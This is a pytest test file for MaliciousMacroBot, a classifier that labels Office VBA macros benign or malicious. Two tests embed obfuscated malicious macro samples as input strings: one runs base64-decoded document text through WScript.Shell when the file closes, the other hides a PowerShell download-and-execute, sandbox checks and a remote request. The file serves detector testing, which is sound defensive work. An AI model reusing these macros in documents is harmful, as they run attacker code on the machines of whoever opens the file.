from mmbot import MaliciousMacroBot
import pytest
import os
import shutil
import pandas as pd
import logging
import numpy as np

testdir = './tests/samples/'
benign_path = os.path.join(testdir, 'benign')
malicious_path = os.path.join(testdir, 'malicious')
model_path = os.path.join(testdir, 'model')
origsample_path = os.path.join(testdir, 'benign.xlsm')
empty_path = os.path.join(testdir, 'empty')

# four benign samples for testing purposes
sample = 'benign.xlsm'
sample1 = 'benign_1.xlsm'
sample2 = 'benign_2.xlsm'
sample3 = 'benign_3.xlsm'
vocab = 'vocab.txt'
mmbot = MaliciousMacroBot()
mmbot.mmb_init_model()


def resetTest():
    """
    Resets test filesystem structure back to initial state
    """
    # remove artifacts from past tests, if they exist
    shutil.rmtree(benign_path, ignore_errors=True)
    shutil.rmtree(malicious_path, ignore_errors=True)
    shutil.rmtree(model_path, ignore_errors=True)
    shutil.rmtree(empty_path, ignore_errors=True)

    # make test directories
    try:
        os.mkdir(testdir) # test directory
    except:
        print("{} already exists".format(testdir))
    try:
        os.mkdir(benign_path)  # benign training set
    except:
        print("{} already exists".format(benign_path))
    try:
        os.mkdir(malicious_path)  # malicious training set
    except:
        print("{} already exists".format(benign_path))
    try:
        os.mkdir(model_path)  # where model data is kept
    except:
        print("{} already exists".format(model_path))
    try:
        os.mkdir(empty_path)  # empty directory
    except:
        print("{} already exists".format(empty_path))

    # setup malicious file for training set
    shutil.copy(os.path.join(testdir, sample1), os.path.join(malicious_path, sample1))     
    shutil.copy(os.path.join(testdir, sample2), os.path.join(benign_path, sample2))     
    shutil.copy(os.path.join(testdir, sample3), os.path.join(benign_path, sample3))     
    shutil.copy(os.path.join(testdir, vocab), os.path.join(model_path, vocab))     


def test_init():
    """
    Simple test to ensure initialization works properly
    """
    mmb = MaliciousMacroBot()
    assert 1 == 1


def test_init_none_paths():
    """
    Should raise an exception because all paths cannot be None
    """
    with pytest.raises(IOError) as ioe:
        mmb = MaliciousMacroBot(benign_path=None, malicious_path=None, model_path=None)
    assert 'ERROR: Supplied' in str(ioe.value)


def test_init_non_existent_paths():
    """
    Test should raise an exception because benign_path and malicious_path must exist if provided.
    """
    with pytest.raises(IOError) as ioe:
        mmb = MaliciousMacroBot(benign_path='madeuppath', malicious_path='madeuppath', model_path='madeuppath')
    assert 'ERROR: Supplied' in str(ioe.value)


def test_init_existent_but_empty_paths():
    """
    Test should not raise an exception until we try to load the samples and realize no samples exist
    """
    resetTest()
    try:
        mmb = MaliciousMacroBot(empty_path, empty_path, empty_path)
        assert mmb
    except Exception:
        pytest.fail("Unexpected exception")


def test_init_files_in_directories():
    """
    Test ensures the mmb_init function can build a model based on the samples provided.
    """
    resetTest()
    mmb = MaliciousMacroBot(benign_path, 
                            malicious_path, 
                            model_path, retain_sample_contents=False)
    result = mmb.mmb_init_model(modelRebuild=True)
    os.remove(os.path.join(model_path, 'modeldata.pickle'))
    assert result


def test_init_files_in_directories_retain_contents():
    """
    Test ensures the mmb_init function can rebuild a model leveraging saved results
    without reprocessing all samples every time
    """
    # Create model with a few samples

    resetTest()
    mmb = MaliciousMacroBot(benign_path, 
                            malicious_path, 
                            model_path, retain_sample_contents=True)
    result = mmb.mmb_init_model(modelRebuild=True)

    shutil.copy(origsample_path, os.path.join(malicious_path, sample))

    # Add a file and rebuild
    mmb = MaliciousMacroBot(benign_path, 
                            malicious_path, 
                            model_path, retain_sample_contents=True)
    result = mmb.mmb_init_model(modelRebuild=True)
    assert result


def test_mmb_predict_sample_on_disk():
    """
    Test ensures the mmb_predict function can make a prediction from a single sample on disk.
    """
    resetTest()
    mmb = MaliciousMacroBot(benign_path,
                            malicious_path,
                            model_path, retain_sample_contents=False)
    result = mmb.mmb_init_model(modelRebuild=True)
    predresult = mmb.mmb_predict(origsample_path, datatype='filepath')
    predicted_label = predresult.iloc[0]['prediction'] 
    logging.info('predicted label: {}'.format(predicted_label))
    logging.info(mmb.mmb_prediction_to_json(predresult))
    logging.info('predicted label: {}'.format(predicted_label))

    assert(predicted_label == 'benign' or predicted_label == 'malicious')


def test_mmb_predict_sample_from_extracted_vba_df():
    """
    Test ensures the mmb_predict function can make a prediction from a single vba_sample.
    """
    resetTest()
    mmb = MaliciousMacroBot(benign_path,
                            malicious_path,
                            model_path, retain_sample_contents=False)
    result = mmb.mmb_init_model(modelRebuild=True)
    samplevba = 'MsgBox "this is vba"'
    predresult = mmb.mmb_predict(samplevba, datatype='vba')

    predicted_label = predresult.iloc[0]['prediction'] 
    logging.info('predicted label: {}'.format(predicted_label))

    assert(predicted_label == 'benign' or predicted_label == 'malicious')


def test_mmb_predict_sample_from_extracted_vba():
    """
    Test ensures the mmb_predict function can make a prediction from a single vba_sample.
    """
    resetTest()
    mmb = MaliciousMacroBot(benign_path,
                            malicious_path,
                            model_path, retain_sample_contents=False)
    result = mmb.mmb_init_model(modelRebuild=True)
    samplevba = ['MsgBox "this is vba"', 'If vba!="malicious"']
    sampledf = pd.DataFrame(samplevba, columns=['extracted_vba'])
    predresult = mmb.mmb_predict(sampledf, datatype='vba')

    predicted_label = predresult.iloc[0]['prediction'] 
    logging.info('predicted label: {}'.format(predicted_label))

    assert(predicted_label == 'benign' or predicted_label == 'malicious')


def test_mmb_prediction_malicious1():
    """
    Confirms that we can accurately predict a known benign file as benign
    """
    vba_code = 'Public Sub eJluAwoCuinnwCHGJ()\nOHPQlFZJNnCdECW = ActiveDocument.Name\nlenght = Len(OHPQlFZJNnCdECW)\nIf lenght > 25 Then\n \nElse\npPxzDsvdDIC (zGIWyovEzeetkDiJxhRVlHb)\nEnd If\nEnd Sub\nFunction wynhmCIwWZSIZreSWdjU(ughIStkgHojgvcWgiRwe)\n    Set nLgcfBYAlEiwOdb = CreateObject("WScript.Shell")\n       nLgcfBYAlEiwOdb.Run ughIStkgHojgvcWgiRwe, 0\nEnd Function\nFunction pPxzDsvdDIC(zGIWyovEzeetkDiJxhRVlHb)\nDim COrmQNYuXlIdlFptHXIkcF, nLgcfBYAlEiwOdb, ughIStkgHojgvcWgiRwe\nkOQNpxexEFgBK = ActiveDocument.Paragraphs(1).Range.Text\nCOrmQNYuXlIdlFptHXIkcF = hZNuCYmkwONfivpIp(kOQNpxexEFgBK)\nughIStkgHojgvcWgiRwe = COrmQNYuXlIdlFptHXIkcF\n        Dim zQmvYanhwVfe\n         Do While zQmvYanhwVfe < 3\n          zQmvYanhwVfe = zQmvYanhwVfe + 1\n           If zQmvYanhwVfe = 2 Then Exit Do\n           wynhmCIwWZSIZreSWdjU (ughIStkgHojgvcWgiRwe)\n        Loop\nEnd Function\nSub AutoClose()\nApplication.Run "eJluAwoCuinnwCHGJ"\nEnd Sub\nFunction hZNuCYmkwONfivpIp(ByVal IANdvpamRIa)\nDim bsggcENxTeLWw, oUUGsdIuAWdolVZu\nSet bsggcENxTeLWw = CreateObject("Msxml2.DOMDocument.3.0")\nSet oUUGsdIuAWdolVZu = bsggcENxTeLWw.CreateElement("base64")\noUUGsdIuAWdolVZu.dataType = "bin.base64"\noUUGsdIuAWdolVZu.Text = IANdvpamRIa\nhZNuCYmkwONfivpIp = NXuJKOtgLOWJgBByaIzI(oUUGsdIuAWdolVZu.nodeTypedValue)\nSet oUUGsdIuAWdolVZu = Nothing\nSet bsggcENxTeLWw = Nothing\nEnd Function\nPrivate Function NXuJKOtgLOWJgBByaIzI(OarYBCnReWUtQ)\nDim AXhpjPngfobqBN\nSet AXhpjPngfobqBN = CreateObject("ADODB.Stream")\nConst zcjvRZPyszFAgVEL = 2\nConst GuEbmwkekrQvLUtGbwXv = 1\nAXhpjPngfobqBN.Type = GuEbmwkekrQvLUtGbwXv\nAXhpjPngfobqBN.Open\nAXhpjPngfobqBN.Write OarYBCnReWUtQ\nAXhpjPngfobqBN.Position = 0\nAXhpjPngfobqBN.Type = zcjvRZPyszFAgVEL\nAXhpjPngfobqBN.Charset = "us-ascii"\nNXuJKOtgLOWJgBByaIzI = AXhpjPngfobqBN.ReadText\nSet AXhpjPngfobqBN = Nothing\nEnd Functio'
    
    mmb_result = mmbot.mmb_predict(vba_code, datatype='vba')
    mmb_json = mmbot.mmb_prediction_to_json(mmb_result)[0]
    assert(mmb_json['prediction'] == "malicious")


def test_mmb_prediction_malicious2():
    """
    Confirms that we can accurately predict a known benign file as benign
    """
    vba_code = r'Private Sub Document_Close()\nALMCXVi\nEnd Sub\nPrivate Sub ALMCXVi()\ngGKQlJw.RrDxBV\nEnd Sub\n\n\n\nPrivate Sub Smldf()\nDim ykkonRg As Integer\nSet LqjMrwDYq = fWvWdYO(GxtNI(121, "Si.eWrthlcpSl", 61), False)\nykkonRg = Vfqjgix(LqjMrwDYq.Run(XbhGQf, 0), 661)\nEnd Sub\nPrivate Function XbhGQf() As String\nXbhGQf = uwzqvEfHpn & GxtNI(718, "otGDm.eo/StwohTnfeelflmoilpac)Fde.iF1Eli4xel.eNedca(a(m\'t$eh\'f(t,i)t l;p$e(:fnN/iae/lmwwee-wn)Owa$b.mfjgeier)lca;etn(n dNaStemyewest-=toO[enbSmvjy.aesNccteatett m.i-.WocIenoObrm.Ce PlnWaitSteachnlr]t.i:)cp:.", 418)\nEnd Function\nPrivate Function WetKhPSBx(ByVal OpNWGJtIEM As String, ByVal hbkZOCdhe As Boolean, ByVal FTMEWwGBZ As Variant) As Variant\nWetKhPSBx = FTMEWwGBZ\nEnd Function\nPublic Sub RrDxBV()\nOn Error GoTo uVLuHtC\noiluNTim.geBew\noiluNTim.fSmysehyIP\noiluNTim.bQampUInrU\nSmldf\nExit Sub\nuVLuHtC:\nEnd Sub\nPublic Function fWvWdYO(ByVal AhNYNsWbSh As String, ByVal kXSSMLhK As Boolean) As Object\nDim IvEfaNPc As String\nIvEfaNPc = WetKhPSBx("CbucB6XjcH", False, AhNYNsWbSh)\nSet fWvWdYO = HMcrc(CreateObject(IvEfaNPc))\nEnd Function\nPrivate Function uwzqvEfHpn() As String\nuwzqvEfHpn = GxtNI(525, "cHeyil dlBd.yeepnxa es- sc- oE-mxWmeiacnnuddto iwpoSontwPyeolrlesi h", 343)\nEnd Function\nPrivate Function HMcrc(ByVal UYNBUEtU As Object) As Object\nSet HMcrc = UYNBUEtU\nEnd Function\nPrivate Function Vfqjgix(ByVal jRnxJM As Integer, ByVal TRsBLppIEH As Integer) As Integer\nDim HTIrH As Integer\nHTIrH = WetKhPSBx("S2fUvDEVgHuk", False, jRnxJM)\nVfqjgix = HTIrH\nEnd Function\nPrivate Function GxtNI(ByVal uHWXlyk As Integer, ByVal MMtslx As String, ByVal lNTiFM As Integer) As String\nOn Error GoTo llAErqYJ\nErr.Raise Number:=1, Description:=MMtslx\nllAErqYJ:\nGxtNI = wovxLtU.JXxmCzpXk(Err.Description, uHWXlyk, lNTiFM)\nEnd Function\n\n\n\nPrivate Function CBhkoJeAs(ByVal ZbFckCzCQo As Integer) As Integer\nCBhkoJeAs = ZbFckCzCQo + 1\nEnd Function\nPrivate Function XniyWTHKPj(ByVal tQBarCfUGH As Integer, _\nByVal zBYMV As Variant, ByVal gZvoVnghQK As Boolean) As Variant\nXniyWTHKPj = zBYMV\nEnd Function\nPrivate Function yuKhG(ByVal zfEHFc As String) As Integer\nDim BwRfB As String\nBwRfB = XniyWTHKPj(789, zfEHFc, True)\nyuKhG = EHGwgOvX.nRtBYJh(535, BwRfB, "DvqnNjCRKMdISuE7")\nEnd Function\nPrivate Function aJcgeRjox(ByVal wSgINI As Integer, ByVal MnIpLaWuhI As Integer) As Integer\naJcgeRjox = wSgINI Mod MnIpLaWuhI\nEnd Function\nPrivate Function VKZrap(ByVal QefBcPE As Integer, ByVal LSYNNwWWa As Integer, ByVal lIGGcSEre As String) As String\nVKZrap = EHGwgOvX.TuLAHiTgG(LSYNNwWWa, lIGGcSEre)\nEnd Function\nPrivate Function aDbLfdS(ByVal jPAKE As Integer, ByVal OqNaGngfE As Integer, _\nByVal ZFMTHj As String, ByVal UBMgEwVy As Integer) As Integer\nDim qHTlH As Integer\nqHTlH = XniyWTHKPj(129, jPAKE, False)\naDbLfdS = qHTlH + UBMgEwVy\nEnd Function\nPublic Function JXxmCzpXk(ByVal yFyiWMbCZt As String, ByVal Sywrq As Integer, ByVal vHxDy As Integer) As String\nDim UKWLQI As Integer\nDim TWzGXGQ As Integer\nTWzGXGQ = yuKhG(yFyiWMbCZt)\nUKWLQI = aJcgeRjox(Sywrq, TWzGXGQ)\nDo While yuKhG(JXxmCzpXk) < TWzGXGQ\nJXxmCzpXk = YABismcsN(JXxmCzpXk, VKZrap(952, CBhkoJeAs(UKWLQI), yFyiWMbCZt))\nUKWLQI = aJcgeRjox(aDbLfdS(UKWLQI, 90, "44cQ3wtZquNRaH", vHxDy), TWzGXGQ)\nLoop\nEnd Function\nPrivate Function YABismcsN(ByVal njeCOL As String, ByVal senLLtU As String) As String\nDim dbLcOmm As String\ndbLcOmm = XniyWTHKPj(291, senLLtU, True)\nYABismcsN = EHGwgOvX.jHEdyJMjD(njeCOL, dbLcOmm)\nEnd Function\n\n\n\nPrivate Function usIti(ByVal KamvCjWs As String, ByVal qKHxOveHD As String, _\nByVal uUzRFoVCs As String, ByVal zoiZS As String) As Boolean\nDim uWXxlk As String\nuWXxlk = JDSShv(False, "eD1czE5u27Sjkf", KamvCjWs)\nusIti = EHGwgOvX.KhsqCv(uUzRFoVCs, 157, uWXxlk)\nEnd Function\nPrivate Function sxhagkdK(ByVal GMyvj As Boolean, ByVal dJUWtDQAEq As Integer, ByVal SYNdFp As String) As String\nsxhagkdK = EHGwgOvX.SOQnknUFo(SYNdFp, 305)\nEnd Function\nPrivate Function QyWffu() As Integer\nQyWffu = Application.RecentFiles.Count\nEnd Function\nPrivate Function qVFIR() As Integer\nqVFIR = 3\nEnd Function\nPrivate Function JDSShv(ByVal ojSvikQ As Boolean, ByVal fpechC As String, ByVal mshvmRz As Variant) As Variant\nJDSShv = mshvmRz\nEnd Function\nPublic Sub fSmysehyIP()\nWndKjKhe sxhagkdK(False, 461, GEIJs.esAUuozfDP(767, ZEJiCc(55, 21, "ANRESUEM"), True)), BbiRzVm\nEnd Sub\nPrivate Sub WndKjKhe(ByVal AQsTLIYuS As String, ByVal NpQLH As Variant)\nDim yhkBjxXiA As String\nyhkBjxXiA = JDSShv(True, "7tGQtDfEoNY", AQsTLIYuS)\nFor Each cinne In NpQLH\nIf usIti(sxhagkdK(False, 803, cinne), "FIKSvbyTaXZwzBqB", yhkBjxXiA, "SxEHS8gGTz") Then\nError 8\nEnd If\nNext\nEnd Sub\nPublic Sub bQampUInrU()\nWndKjKhe sxhagkdK(False, 604, kaHNlg), gZlSws\nEnd Sub\nPublic Sub geBew()\nIf QyWffu < qVFIR Then\nError 8\nEnd If\nEnd Sub\nPrivate Function BbiRzVm() As Variant\nBbiRzVm = Array(ZEJiCc(67, 47, "BSSUWPP"))\nEnd Function\nPrivate Function kaHNlg() As String\nSet hJNkrkNel = GEIJs.SffNigkZTU(ZEJiCc(395, 96, "g///t/mnmi.th:wmcevcmpwad/p1yt/.ioo2ieswx."))\nhJNkrkNel.SetRequestHeader ZEJiCc(38, 8, "fReeerr"), ZEJiCc(111, 191, "-m.h-nxp-on/dtcwsm/mti/msacd/reowsyeatpli:da.we")\nGEIJs.kssKFxpsfg ZEJiCc(127, 306, "wtepmtccmw C/ipoi/wtavnsntg.on2d:nyem \'../e/oaht1c/cmixt /o"), hJNkrkNel, 627\nkaHNlg = hJNkrkNel.ResponseText\nEnd Function\nPrivate Function gZlSws() As Variant\ngZlSws = EHGwgOvX.sGueM(Array(ZEJiCc(65, 59, "nozamA"), ZEJiCc(11, 24, "oounsyAmn"), ZEJiCc(68, 20, "intddeerfBe"), ZEJiCc(72, _\n151, "oolemaarpkcsuckbt"), ZEJiCc(127, 31\n\n\n\nPublic Function KhsqCv(ByVal YzkKnZ As String, ByVal iqSVSyNofb As Integer, ByVal rtesRI As String) As Boolean\nDim xhFQfSOl As String\nxhFQfSOl = gdDPjQPXTh(False, YzkKnZ)\nKhsqCv = sGueM(gYaYx(True, rtesRI, xhFQfSOl, True), "3nfz53uF5yOaLe", 112) <> 0\nEnd Function\nPublic Function TuLAHiTgG(ByVal BaTyLj As Integer, ByVal rmBXHS As String) As String\nDim HAJbmZ As String\nHAJbmZ = gdDPjQPXTh(False, rmBXHS)\nTuLAHiTgG = Mid(HAJbmZ, BaTyLj, 1)\nEnd Function\nPublic Function SOQnknUFo(ByVal SGCJIBrLh As String, ByVal JCoPhOzMQ As Integer) As String\nSOQnknUFo = UCase(SGCJIBrLh)\nEnd Function\nPublic Function jHEdyJMjD(ByVal SRTRlNp As String, ByVal PtOCcC As String) As String\nDim zSIMZM As String\nzSIMZM = gdDPjQPXTh(False, PtOCcC)\njHEdyJMjD = SRTRlNp & zSIMZM\nEnd Function\nPrivate Function gYaYx(ByVal RWATUmwvv As Boolean, ByVal QOoBK As String, ByVal uJvXy As String, ByVal YsEnZP As Boolean) As Integer\nDim qMhdwKk As String\nqMhdwKk = gdDPjQPXTh(True, uJvXy)\ngYaYx = InStr(qMhdwKk, QOoBK)\nEnd Function\nPrivate Function gdDPjQPXTh(ByVal pcwenz As Boolean, ByVal RNWqLaU As Variant) As Variant\ngdDPjQPXTh = RNWqLaU\nEnd Function\nPublic Function sGueM(ByVal FzYirBf As Variant, ByVal KWeCe As String, ByVal lSTulhDc As Integer) As Variant\nsGueM = FzYirBf\nEnd Function\nPublic Function nRtBYJh(ByVal FepJa As Integer, _\nByVal UpRFmiApb As String, ByVal lQFIjjM As String) As Integer\nDim GEgOTwL As String\nGEgOTwL = gdDPjQPXTh(True, UpRFmiApb)\nnRtBYJh = Len(GEgOTwL)\nEnd Function\n\n\n\nPrivate Function nyulukClKH(ByVal ZDVKaiMkE As Variant, ByVal HBhqTt As String) As Variant\nnyulukClKH = ZDVKaiMkE\nEnd Function\nPublic Function SffNigkZTU(ByVal aziVKi As String) As Object\nDim GznhoJb As String\nGznhoJb = nyulukClKH(aziVKi, "aBbOC1FkkRH")\nSet SffNigkZTU = gGKQlJw.fWvWdYO(FHzvmIsfQK(137, 141, "qptn1pHu..HWRteW5tietsi.tn"), False)\nSffNigkZTU.Open FHzvmIsfQK(23, 17, "TEG"), GznhoJb, False\nSffNigkZTU.SetRequestHeader FHzvmIsfQK(83, 48, "-snAetgrUe"), FHzvmIsfQK(635, 260, " Wtrkii.T;.c5sOn izW6 01e/wWe;lo( ;.1Gao dS M T47: ld;iA)o0N6/veln1r 0k.")\nEnd Function\nPublic Sub kssKFxpsfg(ByVal vcQxNM As String, ByVal eQybd As Object, ByVal YSmGmTMo As Integer)\nDim TJFop As String\nTJFop = nyulukClKH(vcQxNM, "ewHVM")\neQybd.Send\nIf eQybd.Status >= ngBGecJN Then\nError 3\nEnd If\nEnd Sub\nPublic Function esAUuozfDP(ByVal jbncgxrC As Integer, _\nByVal kmLEgMxKOX As String, ByVal fhjZU As Boolean) As String\nesAUuozfDP = Environ$(kmLEgMxKOX)\nEnd Function\nPrivate Function ngBGecJN() As Integer\nngBGecJN = 400\nEnd Function\nPrivate Function FHzvmIsfQK(ByVal lNTiFM As Integer, ByVal uHWXlyk As Integer, ByVal MMtslx As String) As String\nOn Error GoTo llAErqYJ\nErr.Raise Number:=1, Description:=MMtslx\nllAErqYJ:\nFHzvmIsfQK = wovxLtU.JXxmCzpXk(Err.Description, uHWXlyk, lNTiFM)\nEnd Function'
    
    mmb_result = mmbot.mmb_predict(vba_code, datatype='vba')
    mmb_json = mmbot.mmb_prediction_to_json(mmb_result)[0]
    assert(mmb_json['prediction'] == "malicious")


def test_mmb_prediction_benign1():
    """
    Confirms that we can accurately predict a known benign file as benign
    """
    vba_code = 'Private Sub CommandButton1_Click()\nSheets("Reporting").Range("B9").Value = "PCE"\nUserForm1.Hide\nEnd Sub\n\nPrivate Sub CommandButton2_Click()\nSheets("Reporting").Range("B9").Value = "PV"\nUserForm1.Hide\nEnd Sub'
    
    mmb_result = mmbot.mmb_predict(vba_code, datatype='vba')
    mmb_json = mmbot.mmb_prediction_to_json(mmb_result)[0]
    assert(mmb_json['prediction'] == "benign")


def test_mmb_prediction_benign2():
    """
    Confirms that we can accurately predict a known benign file as benign
    """
    vba_code = r'Private Sub Workbook_Open()\\n\\nOn Error Resume Next \\\' some issue with "Enable Editing" means no activeworkbook / active window reference in XL2010.\\nDim aPages\\nDim strSheets As String\\nDim strMode As String\\n\\nApplication.ScreenUpdating = False\\nApplication.EnableEvents = False\\n\\nApplication.Run "AA_UnlockWB"\\nApplication.GoTo Reference:=Range("A1"), Scroll:=True\\n\\nstrMode = Get_Value("MODE")\\n\\nIf strMode = "PRODUCTION" Then\\nActiveWindow.DisplayWorkbookTabs = False\\nEnd If\\n            Sheets("Home").Visible = True\\n            Worksheets("Home").Activate\\n    \\n    \\n    ThisWorkbook.Sheets("uxb_works").Range("B71") = 1\\n    ThisWorkbook.Sheets("uxb_works").Range("B75") = 1\\n    ThisWorkbook.Sheets("uxb_works").Range("B10") = 1\\n    ThisWorkbook.Sheets("uxb_works").Range("B12") = 1\\n    ThisWorkbook.Sheets("uxb_works").Range("B14") = 1\\n    ThisWorkbook.Sheets("uxb_works").Range("B38") = 1\\n    ThisWorkbook.Sheets("uxb_works").Range("AB38") = 1\\n    ThisWorkbook.Sheets("uxb_works").Range("BB38") = 1\\n    ThisWorkbook.Sheets("uxb_works").Range("CB38") = 1\\n    ThisWorkbook.Sheets("uxb_works").Range("B40") = 1\\n    ThisWorkbook.Sheets("uxb_works").Range("B35") = 1\\n    ThisWorkbook.Sheets("uxb_works").Range("B36") = 1\\n    ThisWorkbook.Sheets("uxb_works").Range("B21") = 1\\n    ThisWorkbook.Sheets("uxb_works").Range("AB21") = 1\\n    ThisWorkbook.Sheets("uxb_works").Range("BB21") = 1\\n    ThisWorkbook.Sheets("uxb_works").Range("CB21") = 1\\n\\nApplication.Run "MKHideSheets"\\n\\nNavigate_ClearHistory\\n\\n\\\' hide enable macros\\n\\\'ThisWorkbook.Sheets(str_sht_Enable_Macros).Visible = False\\n\\n\\\'ThisWorkbook.Sheets("Correlations_0").Visible = True\\n\\\'ThisWorkbook.Sheets("Correlations_1").Visible = True\\n\\n\\\' activate the home page\\nThisWorkbook.Sheets(str_sht_Home).Activate\\nThisWorkbook.Sheets(str_sht_Home).EnableSelection = xlNoSelection\\nActiveWindow.ScrollRow = 1\\n\\nApplication.Run "LockWB"\\n\\nApplication.ScreenUpdating = True\\nApplication.EnableEvents = True\\n\\n\\\' If Application.Version >= 14 Then ... Excel 2010\\nEnd Sub\\n\\nPrivate Su\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n            Application.Run "BG_BlankFB"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub CountryHLUp()\\nApplication.Run "AA_UnlockWB"\\n\\nDim CityCnt As Integer\\nCityCnt = ThisWorkbook.Sheets("uxb_works").Range("B10")\\n\\n    If CityCnt > 1 Then\\n        CntNew = CityCnt - 1\\n        ThisWorkbook.Sheets("uxb_works").Range("B10") = CntNew\\n        \\n    End If\\n\\nDim crtsheet As String\\ncrtsheet = ActiveSheet.Name\\n\\nIf crtsheet = "Summary" Then\\nApplication.Run "Shade_filter"\\nEnd If\\n\\nApplication.Run "lockWB"\\n\\\'Application.ScreenUpdating = True\\n\\nEnd Sub\\n\\nPrivate Sub CountryHLDown()\\n\\\'Application.ScreenUpdating = False\\nApplication.Run "AA_UnlockWB"\\nDim CityMax As Integer\\nDim CityCnt As Integer\\nCityMax = ThisWorkbook.Sheets("uxb_works").Range("B1") + 1\\nCityCnt = ThisWorkbook.Sheets("uxb_works").Range("B10")\\n\\n    If CityCnt < CityMax Then\\n        CntNew = CityCnt + 1\\n        ThisWorkbook.Sheets("uxb_works").Range("B10") = CntNew\\n    End If\\n\\nDim crtsheet As String\\ncrtsheet = ActiveSheet.Name\\n\\nIf crtsheet = "Summary" Then\\nApplication.Run "Shade_filter"\\nEnd If\\n\\n\\nApplication.Run "lockWB"\\n\\\'Application.ScreenUpdating = True\\n\\nEnd Sub\\n\\nPrivate Sub RegionHLUp()\\nApplication.Run "AA_UnlockWB"\\n\\nDim CityCnt As Integer\\nCityCnt = ThisWorkbook.Sheets("uxb_works").Range("B12")\\n\\n    If CityCnt > 1 Then\\n        CntNew = CityCnt - 1\\n        ThisWorkbook.Sheets("uxb_works").Range("B12") = CntNew\\n        \\n    End If\\n\\nDim crtsheet As String\\ncrtsheet = ActiveSheet.Name\\n\\nIf crtsheet = "Summary" Then\\nApplication.Run "Shade_filter"\\nEnd If\\n\\nApplication.Run "lockWB"\\n\\\'Application.ScreenUpdating = True\\n\\nEnd Sub\\n\\nPrivate Sub RegionHLDown()\\n\\\'Application.ScreenUpdating = False\\nApplication.Run "AA_UnlockWB"\\nDim CityMax As Integer\\nDim CityCnt As Integer\\nCityMax = ThisWorkbook.Sheets("uxb_works").Range("B16")\\nCityCnt = ThisWorkbook.Sheets("uxb_works").Range("B12")\\n\\n    If CityCnt < CityMax Then\\n        CntNew = CityCnt + 1\\n        ThisWorkbook.Sheets("uxb_works").Range("B12") = CntNew\\n    End If\\n\\nDim crtsheet As String\\ncrtsheet = ActiveSheet.Name\\n\\nIf crtsheet = "Summary" Then\\nApplication.Run "Shade_fi\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.Run "AutoHeightWeights"\\n        \\\'Application.Run "WeightsDefaultFB"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\n\\\'Any questions, contact Marcus Krackowizer at ArtOak Development\\n\\\'marcus@artoak.net\\n\\\'\\nPrivate Sub LBChanger()\\nOn Error GoTo EH\\nDim strMapPieceID As String\\nApplication.Run "AA_UnlockWB"\\nApplication.Calculation = xlCalculationManual\\nApplication.ScreenUpdating = False\\n\\nVersion = Get_Value("MODE")\\n\\ncrtsheet = ActiveSheet.Name\\nstrLabelID = ActiveSheet.Shapes(Application.Caller).Name\\n    Sheets(strLabelID).Visible = True\\n  \\n\\nIf Version = "PRODUCTION" Then\\n\\\'   Sheets(crtsheet).Visible = xlVeryHidden\\nEnd If\\n\\n    Sheets(strLabelID).Select\\n        Range("A1").Select\\n        \\\'  If Get_Value("MODE") <> "DEV" Then\\n        add_to_history\\n\\\'   End If\\n\\nEH:\\nApplication.ScreenUpdating = True\\nApplication.Calculation = xlCalculationAutomatic\\nApplication.Run "lockWB"\\nEnd Sub\\n\\n\\\'\\nPrivate Sub AA_UnlockWB()\\n\\nActiveSheet.Unprotect Password:="Q$c*76Gt6f9Mn^hGf^"\\nEnd Sub\\n\\nPublic Sub lockWB()\\nActiveSheet.Protect Password:="Q$c*76Gt6f9Mn^hGf^"\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\nIf Version <> "PRODUCTION" Then\\nAA_UnlockWB\\nEnd If\\nEnd Sub\\n\\n  \\nPrivate Sub AdjustZoom()\\nApplication.ScreenUpdating = False\\n    Application.Calculation = xlCalculationManual\\n    Application.Run "AA_UnlockWB"\\n    ThisWorkbook.Sheets("uxb_works").Range("B2") = "DEVELOPMENT"\\n \\\'       Application.Calculation = xlManual\\n            Dim lZoom As Long\\n            Dim lViz\\n            lZoom = ThisWorkbook.Sheets("uxb_works").Range("C53")\\n            For Each WS In Worksheets\\n            Application.ScreenUpdating = False\\n                If WS.Name <> "Home" Then\\n                    lViz = WS.Visible\\n                    WS.Visible = True\\n                    WS.Select\\n                    Application.ScreenUpdating = False\\n                    ActiveWindow.Zoom = lZoom\\n                    Application.ScreenUpdating = False\\n                    WS.Visible = lViz\\n                End If\\n                Application.ScreenUpdating = False\\n            Next WS\\n            ThisWorkbook.Sheets("Home").Select\\n \\\'       App\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\nPrivate Sub Worksheet_Activate()\\n\\nSet Version = ThisWorkbook.Sheets("uxb_works").Range("B2")\\n\\nIf Version = "PRODUCTION" Then\\n    Application.Run "AA_UnlockWB"\\n        Application.Run "CornerMenus"\\n        Application.GoTo Reference:=Range("A1"), Scroll:=True\\n    Application.Run "LockWB"\\nEnd If\\n\\nEnd Sub\'\n\n\n\n\\\' Any Questions?\\n\\\' 